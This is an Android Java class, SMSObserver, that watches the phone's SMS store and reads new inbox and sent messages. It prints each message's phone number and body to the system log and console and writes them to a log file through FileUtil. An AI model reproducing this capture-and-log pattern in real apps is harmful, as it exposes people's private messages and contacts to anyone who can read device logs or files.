package com.sin180.android.sendmsg;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

public class SMSObserver extends ContentObserver {

	public static final String TAG = "SMSObserver";

	private static final String[] PROJECTION = new String[]

	{

	SMS._ID,// 0

			SMS.TYPE,// 1

			SMS.ADDRESS,// 2

			SMS.BODY,// 3

			SMS.DATE,// 4

			SMS.THREAD_ID,// 5

			SMS.READ,// 6

			SMS.PROTOCOL // 7

	};

	private static final String SELECTION =

	SMS._ID + " > %s" +

	// " and " + SMS.PROTOCOL + " = null" +
	//
	// " or " + SMS.PROTOCOL + " = " + SMS.DATE + ")" +

			" and (" + SMS.TYPE + " = " + SMS.MESSAGE_TYPE_INBOX +

			" or " + SMS.TYPE + " = " + SMS.MESSAGE_TYPE_SENT + ")";

	private static final int COLUMN_INDEX_ID = 0;

	private static final int COLUMN_INDEX_TYPE = 1;

	private static final int COLUMN_INDEX_PHONE = 2;

	private static final int COLUMN_INDEX_BODY = 3;

	private static final int COLUMN_INDEX_PROTOCOL = 7;

	private static final int MAX_NUMS = 10;

	private static int MAX_ID = 0;

	private ContentResolver mResolver;

	private Handler mHandler;

	public SMSObserver(ContentResolver contentResolver, Handler handler) {
		super(handler);
		this.mResolver = contentResolver;
		this.mHandler = handler;
	}

	@Override
	public void onChange(boolean selfChange) {
		Log.i(TAG, "onChange : " + selfChange + "; " + MAX_ID + "; "
				+ SELECTION);
		super.onChange(selfChange);
		Cursor cursor = mResolver.query(SMS.CONTENT_URI, PROJECTION,
				String.format(SELECTION, MAX_ID), null, null);
		int id, type, protocol;
		String phone = "", body = "";
		Message message;
		MessageItem item;
		int iter = 0;
		boolean hasDone = false;
		while (cursor.moveToNext()) {
			id = cursor.getInt(COLUMN_INDEX_ID);
			type = cursor.getInt(COLUMN_INDEX_TYPE);
			phone = cursor.getString(COLUMN_INDEX_PHONE);
			body = cursor.getString(COLUMN_INDEX_BODY);
			protocol = cursor.getInt(COLUMN_INDEX_PROTOCOL);
			System.out.println("sms info----- phone :" + phone + "  body :"+ body + " type: " + type + " protocol : " + protocol);
			if (hasDone) {
				MAX_ID = id;
				break;
			}
			if (protocol == SMS.PROTOCOL_SMS && body != null) {
				Log.e(TAG, "==============");
				hasDone = true;
				item = new MessageItem();
				item.setId(id);
				item.setType(type);
				item.setPhone(phone);
				item.setBody(body);
				item.setProtocol(protocol);
				Log.e(TAG, item.getId() + " Body: " + item.getBody() + " Phone : " + item.getPhone());
				FileUtil.writeLogtoFile(phone, type + "", body);
				message = new Message();
				message.obj = item;
				mHandler.sendMessage(message);
			} else {
				Log.e(TAG, "======33333333333=======");
				if (id > MAX_ID)
					MAX_ID = id;
			}
			if (iter > MAX_NUMS)
				break;
			iter++;
		}
		Log.e(TAG, "Body: " + body + " Phone : " + phone);
	}
}
